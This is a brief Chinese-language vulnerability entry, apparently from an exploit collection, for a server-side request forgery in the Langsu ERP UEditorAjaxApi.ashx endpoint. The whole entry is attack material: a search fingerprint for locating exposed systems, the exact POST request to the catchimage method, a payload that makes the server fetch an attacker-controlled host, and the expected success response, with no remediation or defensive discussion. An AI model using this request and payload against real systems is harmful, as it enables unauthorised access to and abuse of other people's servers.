# 朗速ERPUEditorAjaxApi.ashx存在SSRF漏洞

朗速 ｜ SSRF ｜ —
- **指纹**：`body="/Resource/Scripts/Yw/Yw_Bootstrap.js"`
- **请求**：`POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1`

**Payload**
```
source[]=http://vpsip
```
- **响应特征**：200